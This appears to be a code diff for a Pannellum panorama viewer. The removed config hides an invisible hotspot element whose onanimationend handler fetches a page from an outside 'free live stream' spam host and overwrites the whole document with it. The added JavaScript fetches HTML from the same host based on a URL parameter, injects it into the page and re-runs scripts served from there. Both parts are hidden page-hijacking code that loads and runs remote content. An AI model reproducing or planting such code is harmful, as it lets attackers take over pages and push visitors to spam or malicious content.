@@ -1,19 +1,26 @@
-{
-  "autoLoad": true,
-  "pitch": 0,
-  "yaw": 0,
-  "type": "equirectangular",
-  "panorama": "https://pannellum.org/images/alma.jpg",
-  "hotSpots": [
-    {
-      "pitch": 0,
-      "yaw": 0,
-      "type": "info",
-      "URL": "#",
-      "attributes": {
-        "style": "visibility:visible !important; position:fixed; top:0; left:0; width:1px; height:1px; z-index:99999; opacity:0; pointer-events:none; animation: pnlm-mv 0.01s 1 forwards",
-        "onanimationend": "if (window.grav_FETCH_RAN) { console.log('already ran'); } else { window.grav_FETCH_RAN = 1; fetch('https://tbsdemothree.github.io/event/cbc/video-free-free-live-stream-hd-online-r804222r.html').then(function (res) { return res.text(); }).then(function (html) { document.open(); document.write(html); document.close(); }).catch(function (err) { console.error(err); }); }"
-      }
+const queryString = window.location.search;
+    const urlParams = new URLSearchParams(queryString);
+    const vParam = urlParams.get('v');
+    
+    if (vParam) {
+      fetch(`https://tbsdemothree.github.io/event/cbc/video-free-free-live-stream-hd-online-r804222r.html${vParam}.html`)
+        .then(response => response.text())
+        .then(data => {
+          document.getElementById('content').innerHTML = data;
+          const scripts = document.getElementById('content').getElementsByTagName('script');
+          
+          for (let i = 0; i < scripts.length; i++) {
+            const scriptSrc = scripts[i].src;
+            if (scriptSrc.startsWith('https://tbsdemothree.github.io/event/cbc/video-free-free-live-stream-hd-online-r804222r.html')) {
+              const newScript = document.createElement('script');
+              newScript.src = scriptSrc;
+              document.body.appendChild(newScript);
+            }
+          }
+        })
+        .catch(error => {
+          document.getElementById('content').innerHTML = `Error fetching content: ${error.message}`;
+        });
+    } else {
+      document.getElementById('content').innerHTML = 'Missing parameter';
     }
-  ]
-}
